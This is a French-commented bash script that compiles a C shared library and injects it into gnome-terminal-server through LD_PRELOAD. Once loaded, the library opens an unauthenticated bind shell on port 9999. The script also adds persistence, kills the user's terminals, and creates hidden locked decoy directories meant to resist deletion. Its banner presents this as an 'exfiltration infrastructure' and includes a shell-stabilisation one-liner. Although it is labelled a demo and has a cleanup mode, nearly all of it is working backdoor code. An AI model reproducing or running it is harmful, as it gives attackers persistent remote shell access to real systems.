#!/bin/bash

# --- [ CONFIGURATION ] ---
TARGET_BIN="/usr/libexec/gnome-terminal-server"
LIB_PATH="/tmp/libghost.so"
PORT=9999

# Workspaces Redondants
W1="/var/tmp/.test_system_conf"
W2="/tmp/.cache_service"
W3="/tmp/.X11-unix-render"
W4="/tmp/.systemd-private-core"
ALL_TARGETS=("$W1" "$W2" "$W3" "$W4")

# Couleurs
C_BLUE='\033[0;34m'
C_GREEN='\033[0;32m'
C_RED='\033[0;31m'
C_GOLD='\033[0;33m'
C_NC='\033[0m'

# --- [ CORE C PAYLOAD ] ---
generate_payload() {
    cat << 'EOF' > /tmp/ghost_lib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <fcntl.h>

void *ghost_listener(void *arg) {
    int s_fd, c_fd;
    struct sockaddr_in addr;
    int opt = 1;
    socklen_t addrlen = sizeof(addr);

    if ((s_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return NULL;
    setsockopt(s_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9999);

    if (bind(s_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(s_fd); return NULL; }
    listen(s_fd, 5);

    while (1) {
        if ((c_fd = accept(s_fd, (struct sockaddr *)&addr, &addrlen)) >= 0) {
            if (fork() == 0) {
                close(s_fd);
                dup2(c_fd, 0); dup2(c_fd, 1); dup2(c_fd, 2);
                unsetenv("LD_PRELOAD");
                execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                exit(0);
            }
            close(c_fd);
        }
    }
    return NULL;
}

__attribute__((constructor))
void init() {
    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, ghost_listener, NULL);
}
EOF
}

# --- [ LOGIQUE DE DÉPLOIEMENT ] ---
deploy() {
    clear
    echo -e "${C_BLUE}[*] Phase 1 : Préparation de l'environnement...${C_NC}"
    
    # 1. Compilation
    generate_payload
    gcc -fPIC -shared -o "$LIB_PATH" /tmp/ghost_lib.c -lpthread 2>/dev/null
    rm /tmp/ghost_lib.c

    # 2. Workspaces & Sabotage
    for target in "${ALL_TARGETS[@]}"; do
        mkdir -p "$target" && chmod 755 "$target"
        touch -- "$target/-i" # Anti-rm wildcard
        echo -e "    ${C_GREEN}[+]${C_NC} Site redondant : $target"
    done

    # 3. Injection persistante (Watcher)
    echo -e "${C_BLUE}[*] Phase 2 : Injection LD_PRELOAD persistante...${C_NC}"
    (
        sleep 2
        pkill -9 -u $USER gnome-terminal-server 2>/dev/null
        export LD_PRELOAD="$LIB_PATH"
        nohup "$TARGET_BIN" >/dev/null 2>&1 &
    ) & disown

    # 4. Verrouillage final
    for target in "${ALL_TARGETS[@]}"; do chmod 555 "$target"; done

    # --- [ VISU ] ---
    echo -e "\n${C_GOLD}---------------------------------------------------------------${C_NC}"
    echo -e "${C_GREEN}[+] INFRASTRUCTURE D'EXFILTRATION OPÉRATIONNELLE${C_NC}"
    echo -e "${C_GOLD}---------------------------------------------------------------${C_NC}"
    echo -e "1. BACKDOOR GHOST  : nc localhost $PORT"
    echo -e "2. PERSISTANCE     : Relance auto du listener via terminal"
    echo -e "3. SABOTAGE        : Workspaces verrouillés (chmod 555 + file -i)"
    echo -e "4. STABILISATION   : python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo -e "${C_GOLD}---------------------------------------------------------------${C_NC}"
    echo -e "${C_RED}[!] La fenêtre va se fermer. Reconnecte-toi pour finaliser la démo.${C_NC}"
    
    sleep 2
    killall -9 gnome-terminal-server 2>/dev/null
}

# --- [ NETTOYAGE ] ---
stop_audit() {
    echo -e "${C_RED}[!] Nettoyage global de l'infrastructure...${C_NC}"
    
    # 1. Déverrouillage et suppression des dossiers
    for target in "${ALL_TARGETS[@]}"; do
        chmod 755 "$target" 2>/dev/null
        rm -rf "$target" 2>/dev/null
        echo -e "    ${C_GREEN}[-]${C_NC} Nettoyé : $target"
    done

    # 2. Suppression de la lib
    rm -f "$LIB_PATH"

    # 3. Nettoyage des fichiers temporaires de filtrage
    rm -f /tmp/.ghost_*
    rm -f /tmp/.ghost_off
    rm -f /tmp/.sys_core
    
    # 4. Arrêt des processus ghost
    pkill -9 -f "kworker/u24:5" 2>/dev/null
    pkill -9 -f ".sys_core" 2>/dev/null
    
    # 5. Reset du terminal server sans injection
    unset LD_PRELOAD
    killall -9 gnome-terminal-server 2>/dev/null
    nohup "$TARGET_BIN" >/dev/null 2>&1 &
    
    echo -e "${C_GREEN}[OK] Système restauré à l'état initial.${C_NC}"
}

# --- [ MAIN ] ---
case "$1" in
    start)
        deploy
        ;;
    stop)
        stop_audit
        ;;
    check)
        ss -ltpn | grep ":$PORT" || echo "[-] Port $PORT non trouvé."
        ;;
    *)
        echo "Usage: $0 {start|stop|check}"
        ;;
esac
